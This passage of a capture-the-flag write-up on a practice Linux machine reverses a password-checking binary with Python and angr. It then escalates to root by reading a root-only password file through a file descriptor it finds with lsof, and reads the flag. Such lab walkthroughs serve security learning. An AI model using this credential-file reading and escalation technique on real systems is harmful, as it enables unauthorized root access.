            if ((int32_t)arg1[6] + (int32_t)arg1[1] == 0xd0) {
                if ((int32_t)arg1[2] - (int32_t)arg1[4] == 10) {
                    if ((int32_t)arg1[3] - (int32_t)arg1[0xe] == -2) {
                        if ((int32_t)arg1[0x19] * (int32_t)arg1[4] == 0x2774) {
                            if ((int32_t)arg1[0x11] + (int32_t)arg1[5] == 0xdb) {
                                if ((int32_t)arg1[6] - (int32_t)arg1[10] == -0xb) {
                                    if ((int32_t)arg1[7] - (int32_t)arg1[0x14] == -10) {
                                        if ((int32_t)arg1[0x11] * (int32_t)arg1[8] == 0x2e45) {
                                            if ((int32_t)arg1[9] - (int32_t)arg1[0x12] == -7) {
                                                if ((int32_t)arg1[10] - (int32_t)arg1[0x18] == 1) {
                                                    if ((int32_t)arg1[4] * (int32_t)arg1[0xb] == 0x2645) {
                                                        if ((int32_t)arg1[0xc] - (int32_t)arg1[3] == 3) {
                                                            if ((int32_t)arg1[0xb] * (int32_t)arg1[0xd] == 0x2bf4) {
                                                                if ((int32_t)arg1[0xe] - (int32_t)arg1[0xd] == -2) {
                                                                    if (arg1[0xf] == arg1[0x17]) {
                                                                        if ((int32_t)arg1[0x10] - (int32_t)arg1[8] == -5) {
                                                                            if ((int32_t)arg1[7] * (int32_t)arg1[0x11] == 0x2a3f) {
                                                                                if ((int32_t)arg1[0x12] - (int32_t)arg1[0xe] == -2) {
                                                                                    if ((int32_t)arg1[0x13] - (int32_t)*arg1 == -8) {
                                                                                        if ((int32_t)arg1[0x14] - (int32_t)arg1[0x17] == 4) {
                                                                                            if ((int32_t)arg1[7] + (int32_t)arg1[0x15] == 0xdc) {
                                                                                                if ((int32_t)arg1[0x16] - (int32_t)arg1[1] == 0xf) {
                                                                                                    if (arg1[0x17] == arg1[0xf]) {
                                                                                                        if ((int32_t)arg1[2] * (int32_t)arg1[0x18] == 0x316e) {
                                                                                                            if ((int32_t)arg1[0x19] - (int32_t)arg1[0xc] == -0xf) {
                                                                                                                puts("Correct pass");
                                                                                                                uVar2 = 1;
                                                                                                            } else {
                                                                                                                uVar2 = 0;
                                                                                                            }
                                                                                                        } else {
                                                                                                            uVar2 = 0;
                                                                                                        }
                                                                                                    } else {
                                                                                                        uVar2 = 0;
                                                                                                    }
                                                                                                } else {
                                                                                                    uVar2 = 0;
                                                                                                }
                                                                                            } else {
                                                                                                uVar2 = 0;
                                                                                            }
                                                                                        } else {
                                                                                            uVar2 = 0;
                                                                                        }
                                                                                    } else {
                                                                                        uVar2 = 0;
                                                                                    }
                                                                                } else {
                                                                                    uVar2 = 0;
                                                                                }
                                                                            } else {
                                                                                uVar2 = 0;
                                                                            }
                                                                        } else {
                                                                            uVar2 = 0;
                                                                        }
                                                                    } else {
                                                                        uVar2 = 0;
                                                                    }
                                                                } else {
                                                                    uVar2 = 0;
                                                                }
                                                            } else {
                                                                uVar2 = 0;
                                                            }
                                                        } else {
                                                            uVar2 = 0;
                                                        }
                                                    } else {
                                                        uVar2 = 0;
                                                    }
                                                } else {
                                                    uVar2 = 0;
                                                }
                                            } else {
                                                uVar2 = 0;
                                            }
                                        } else {
                                            uVar2 = 0;
                                        }
                                    } else {
                                        uVar2 = 0;
                                    }
                                } else {
                                    uVar2 = 0;
                                }
                            } else {
                                uVar2 = 0;
                            }
                        } else {
                            uVar2 = 0;
                        }
                    } else {
                        uVar2 = 0;
                    }
                } else {
                    uVar2 = 0;
                }
            } else {
                uVar2 = 0;
            }
        } else {
            uVar2 = 0;
        }
    } else {
        puts("Incorrect pass");
        uVar2 = 0;
    }
    return uVar2;
}
```

![Victim: shimmer](https://img.shields.io/badge/Victim-shimmer-64b5f6?logo=linux&logoColor=white)

`ls -l /opt/root.pass`:
```
-rw------- 1 root root 15 jun 14  2023 /opt/root.pass ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./calculate_password.py`:
```python
#!/usr/bin/python3

# Initialize an array to hold ASCII values of the password characters
p = [0] * 26

# Assign known values based on the equations derived from the C code
p[4] = 101    # From p[4]*p[11] == 9797 and p[4]=101
p[11] = 97    # From p[4]*p[11] == 9797 and p[11]=9797/p[4]
p[13] = 116   # From p[11]*p[13] == 11252 and p[13]=11252/p[11]
p[12] = 115   # From p[12] = p[13] - 1
p[25] = 100   # From p[25] = p[13] - 16
p[14] = 114   # From p[14] = p[13] - 2
p[3] = 112    # From p[3] = p[14] - 2
p[18] = 112   # From p[18] = p[14] - 2
p[9] = 105    # From p[9] = p[18] - 7
p[2] = 111    # From p[2] = p[4] + 10
p[24] = 114   # From p[2]*p[24] == 12654 and p[24]=12654/p[2]
p[10] = 115   # From p[10] = p[24] + 1
p[6] = 104    # From p[6] = p[10] - 11
p[1] = 104    # From p[6] + p[1] == 208
p[22] = 119   # From p[22] = p[1] + 15
p[5] = 116    # From p[17] + p[5] == 219
p[17] = 103   # From p[17]*p[8] == 11845
p[8] = 115    # From p[17]*p[8] == 11845
p[16] = 110   # From p[16] = p[8] - 5
p[0] = 105    # From p[0] = p[20] - 10
p[7] = 105    # From p[7] = p[20] - 10
p[20] = 115   # From p[20] = p[23] + 4
p[23] = 111   # From p[23] = p[15]
p[15] = 111   # From p[15] = p[23]
p[19] = 97    # From p[19] = p[0] - 8
p[21] = 115   # From p[7] + p[21] == 220
p[25] = 100   # From p[25] = p[12] - 15

# Convert ASCII values to characters
password = ''.join(chr(c) for c in p)

print("The password is:", password)
```

`chmod u+x ./calculate_password.py`

`./calculate_password.py`:
```        
The password is: ihopethisisastrongpassword ←
```

<🔄 Alternative Step.>

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Angr - Examples](https://book.hacktricks.xyz/reversing/reversing-tools-basic-methods/angr/angr-examples)

[**#Input to reach address (indicating the address)**]

```python
import angr
import sys

def main(argv):
  path_to_binary = argv[1]  # :string
  project = angr.Project(path_to_binary)

  # Start in main()
  initial_state = project.factory.entry_state()
  # Start simulation
  simulation = project.factory.simgr(initial_state)

  # Find the way yo reach the good address
  good_address = 0x804867d
  
  # Avoiding this address
  avoid_address = 0x080485A8
  simulation.explore(find=good_address, avoid=avoid_address)

  # If found a way to reach the address
  if simulation.found:
    solution_state = simulation.found[0]

    # Print the string that Angr wrote to stdin to follow solution_state
    print(solution_state.posix.dumps(sys.stdin.fileno()))
  else:
    raise Exception('Could not find the solution')

if __name__ == '__main__':
  main(sys.argv)
```

[**#Input to reach address (indicating prints)**]

```python
# If you don't know the address you want to recah, but you know it's printing something
# You can also indicate that info

import angr
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)
  initial_state = project.factory.entry_state()
  simulation = project.factory.simgr(initial_state)

  def is_successful(state):
    #Successful print
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return b'Good Job.' in stdout_output

  def should_abort(state):
    #Avoid this print
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return b'Try again.' in stdout_output

  simulation.explore(find=is_successful, avoid=should_abort)

  if simulation.found:
    solution_state = simulation.found[0]
    print(solution_state.posix.dumps(sys.stdin.fileno()))
  else:
    raise Exception('Could not find the solution')

if __name__ == '__main__':
  main(sys.argv)
```

`pwn checksec ./pass`:
```                                       
[*] '/home/kali/pass'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled ←
```

`vim ./find_password.py`:
```python
#!/usr/bin/python3

import angr
import sys

def main(argv):
    path_to_binary = argv[1]
    project = angr.Project(path_to_binary)
    initial_state = project.factory.entry_state()
    simulation = project.factory.simgr(initial_state)
    
    def is_successful(state):
        # Successful print
        stdout_output = state.posix.dumps(sys.stdout.fileno())
        return b'Correct pass' in stdout_output
    
    def should_abort(state):
        # Avoid this print
        stdout_output = state.posix.dumps(sys.stdout.fileno())
        return b'Incorrect pass' in stdout_output
    
    simulation.explore(find=is_successful, avoid=should_abort)
    
    if simulation.found:
        solution_state = simulation.found[0]
        solution = solution_state.posix.dumps(sys.stdin.fileno())
        print("[+] Success! Solution is: {}".format(solution.decode('utf-8')))
    else:
        raise Exception('[-] Could not find the solution')

if __name__ == '__main__':
    main(sys.argv)
```

<🔄 Alternative Step.>

`vim ./find_password.py`:
```python
#!/usr/bin/python3

import angr
import sys 

def main():
    path_to_binary =  sys.argv[1]
    project = angr.Project(path_to_binary)
    initial_state = project.factory.entry_state() 
    simulation = project.factory.simgr(initial_state) 
    simulation.explore(find=lambda s: b"Correct pass" in s.posix.dumps(1))

    if simulation.found:
        solution_state = simulation.found[0]
        solution = solution_state.posix.dumps(sys.stdin.fileno())
        print("[+] Success! Solution is: {}".format(solution.decode('utf-8')))
    else:
		raise Exception('[-] Could not find the solution')

if __name__ == "__main__":
    main()
```

</🔄 Alternative Step.>

`chmod u+x ./find_password.py`

`./find_password.py ./pass`:
```
WARNING  | 2024-10-04 07:35:13,298 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory with an unspecified value. This could indicate unwanted behavior.
WARNING  | 2024-10-04 07:35:13,298 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:                                                                                                                                                                   WARNING  | 2024-10-04 07:35:13,298 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state
WARNING  | 2024-10-04 07:35:13,298 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null                                                                                         WARNING  | 2024-10-04 07:35:13,298 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.
WARNING  | 2024-10-04 07:35:13,299 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff64 with 12 unconstrained bytes referenced from 0x5a0540 (strlen+0x0 in libc.so.6 (0xa0540))                                                                                                                                               WARNING  | 2024-10-04 07:35:13,299 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff80 with 1 unconstrained bytes referenced from 0x5a0540 (strlen+0x0 in libc.so.6 (0xa0540))                                                                                                                                               WARNING  | 2024-10-04 07:35:14,127 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffefeff with 1 unconstrained bytes referenced from 0x4016e5 (main+0x54 in pass (0x16e5))                                                                                                                                                     [+] Success! Solution is: ihopethisisastrongpassword ←
```

</🔄 Alternative Step.>

![Victim: shimmer](https://img.shields.io/badge/Victim-shimmer-64b5f6?logo=linux&logoColor=white)

`./pass`:
```
Passwd: ihopethisisastrongpassword ←
Correct pass
Second Passwd: ultrasecretpassword ←
```

![Victim: shimmer](https://img.shields.io/badge/Victim-shimmer-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
shimmer
```

`id`:
```
uid=1001(shimmer) gid=1001(shimmer) grupos=1001(shimmer),100(users)
```

<div>
	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[lsof](https://github.com/lsof-org/lsof)

[**#lsof**]

[lsof](https://en.wikipedia.org/wiki/Lsof) is a command listing open files.
```
$ cat > /tmp/LOG &
cat > /tmp/LOG &
[1] 18083
$ lsof -p 18083
lsof -p 18083
COMMAND   PID   USER   FD   TYPE DEVICE  SIZE/OFF     NODE NAME
cat     18083 yamato  cwd    DIR   0,44      1580 43460784 /tmp/lsof
cat     18083 yamato  rtd    DIR  253,2      4096        2 /
cat     18083 yamato  txt    REG  253,2     47432   678364 /usr/bin/cat
cat     18083 yamato  mem    REG  253,2 111950656   681778 /usr/lib/locale/locale-archive
cat     18083 yamato  mem    REG  253,2   2119256   679775 /usr/lib64/libc-2.27.so
cat     18083 yamato  mem    REG  253,2    187632   655943 /usr/lib64/ld-2.27.so
cat     18083 yamato  mem    REG  253,2     26370   662532 /usr/lib64/gconv/gconv-modules.cache
cat     18083 yamato  mem    REG  253,2      3316  1578981 /usr/lib/locale/en_US.utf8/LC_TIME
cat     18083 yamato    0u   CHR  136,3       0t0        6 /dev/pts/3
cat     18083 yamato    1w   REG   0,44         0 54550934 /tmp/LOG
cat     18083 yamato    2u   CHR  136,3       0t0        6 /dev/pts/3
```

`lsof | head -n 1 && lsof | grep "pass"`:
```
COMMAND    PID TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
sh         983                        shimmer    3r      REG                8,1       15     522246 /opt/root.pass
grep      1056                        shimmer    3r      REG                8,1       15     522246 /opt/root.pass
```

`cd /proc/983/fd`

`ls -l`:
```
total 0
lrwx------ 1 shimmer shimmer 64 oct  4 10:55 0 -> /dev/pts/0
lrwx------ 1 shimmer shimmer 64 oct  4 10:55 1 -> /dev/pts/0
lrwx------ 1 shimmer shimmer 64 oct  4 10:55 10 -> /dev/tty
lrwx------ 1 shimmer shimmer 64 oct  4 10:55 2 -> /dev/pts/0
lr-x------ 1 shimmer shimmer 64 oct  4 10:55 3 -> /opt/root.pass ←
```

<🔄 Alternative Step.>

`cd /proc/self/fd`

`ls -l`:
```
total 0
lrwx------ 1 shimmer shimmer 64 oct  4 10:55 0 -> /dev/pts/0
lrwx------ 1 shimmer shimmer 64 oct  4 10:55 1 -> /dev/pts/0
lrwx------ 1 shimmer shimmer 64 oct  4 10:55 10 -> /dev/tty
lrwx------ 1 shimmer shimmer 64 oct  4 10:55 2 -> /dev/pts/0
lr-x------ 1 shimmer shimmer 64 oct  4 10:55 3 -> /opt/root.pass ←
```

</🔄 Alternative Step.>

`cat 3`:
```
cat: 3: Permiso denegado
```

`cat <&3`:
```
masteradmin420 ←
```

`su root`:
```
Contraseña: ←
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) grupos=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 48
 4 drwx------  3 root root  4096 jun 16  2023 ./
 4 drwxr-xr-x 18 root root  4096 jun 13  2023 ../
 0 lrwxrwxrwx  1 root root     9 jun 14  2023 .bash_history -> /dev/null
 4 -rw-r--r--  1 root root   571 abr 10  2021 .bashrc
 4 -rw-------  1 root root    20 jun 13  2023 .lesshst
 4 -rw-------  1 root root   745 jun 14  2023 .mysql_history
 4 -rw-r--r--  1 root root   161 jul  9  2019 .profile
 4 -rw-r--r--  1 root root    15 jun 14  2023 r0ot.txt ←
 4 drwx------  2 root root  4096 jun 13  2023 .ssh/
16 -rw-------  1 root root 15960 jun 16  2023 .viminfo
```

`cat ./r0ot.txt`:
```
symboliclove4u ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
